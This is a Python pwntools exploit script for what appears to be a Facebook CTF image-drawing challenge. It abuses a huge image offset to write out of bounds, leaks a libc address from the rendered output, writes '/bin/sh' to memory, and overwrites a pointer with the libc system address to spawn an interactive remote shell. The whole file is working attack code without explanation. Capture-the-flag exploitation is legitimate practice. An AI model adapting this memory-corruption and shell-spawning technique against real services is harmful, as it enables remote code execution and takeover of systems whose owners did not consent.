from pwn import *

HOST, PORT = "challenges.fbctf.com", "1340"
# HOST, PORT = "172.17.0.2", 31338
# HOST, PORT = "13.125.123.170", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(">>> ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def upload(id, content):
	ii(1)
	ii(id)
	r.send(content.ljust(0x410,'\x00'))

def image(width, height, offset):
	return 'ASCI'+p32(width)+p32(height)+p32(offset)

def draw(x, y, c):
	ii(1)
	ii('(%d, %d) %c' % (x, y, c))

l=2**31

upload('!', image(32,32,l))
base=0x5000+0x1000-0x1c
base+=0x6000
# base=0x5000-0x1c
def write(offset, content):
	for i,c in enumerate(content):
		draw(offset+i,0,ord(c))

go(4)
ii(1)
ii('!')

write(0x400, 'ey')
write(0x40c, image(8,1,base+0xf60-0x41c))
go(4)
go(4)

go(4)
go(1)
ii('ey')
pause()
go(2)
r.recvuntil(' 0 |')
data=r.recvline().strip()
data=filter(lambda x: x, data.split(' '))
data=[x[-2:] if len(x) >= 2 else '%02x'%ord(x) for x in data]
data=''.join(data[::-1])
data=int(data,16)
print '%x'%data
libc=data-0xba4fa0
go(4)

go(1)
ii('!')
write(base+0x968,'/bin/sh\x00')
write(base+0xf60,p64(libc+0x4f440))
r.interactive()
